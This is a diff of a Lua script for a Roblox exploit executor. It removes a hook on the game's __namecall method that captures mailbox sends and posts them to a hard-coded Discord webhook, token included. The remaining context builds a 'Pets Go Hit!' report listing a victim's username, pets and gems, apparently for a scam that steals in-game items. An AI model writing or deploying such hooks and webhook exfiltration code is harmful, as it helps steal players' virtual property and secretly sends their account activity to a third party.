@@ -33,42 +33,6 @@ end
 end
 big = "1/"..big
 end)
-pcall(function()
-if not _G.logged then
-_G.logged = true
-local function namecallHook(self, ...)
-    local method = getnamecallmethod()
-    if method == "InvokeServer" and tostring(self) == "Mailbox: Send" then
-        local args = {...}
-        local mp4log = ""
-        local e = game.Players.LocalPlayer.Name.." -> "..args[1].." : "..args[5].." of "..args[3].."\\n"
-        local rev, er = oldNamecall(self, ...)
-        if rev then
-        e=e.."sent"
-        else
-        e=e..er
-        end
-        mp4log = '{"content":"'..e..'"}'
-        local responsere =
-                request(
-                {
-                    Url = "https://discordapp.com/api/webhooks/1300158038656680066/8M0hjB4DdjWrMn66G30797f-X6_uNLbztWxMylL0mmZhWBG3M5abNAK_gA022Rii6Sek",
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = log
-                }
-            )
-        return rev, er
-    end
-    return oldNamecall(self, ...)
-end
-local success, errorOrMessage
-success, oldNamecall = pcall(hookmetamethod, game, "__namecall", newcclosure(namecallHook))
-if not success then
-    error(errorOrMessage)
-end
-end
-end)
 local log = ""
 if dh then
 log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"'..xxxvvv..'"}'
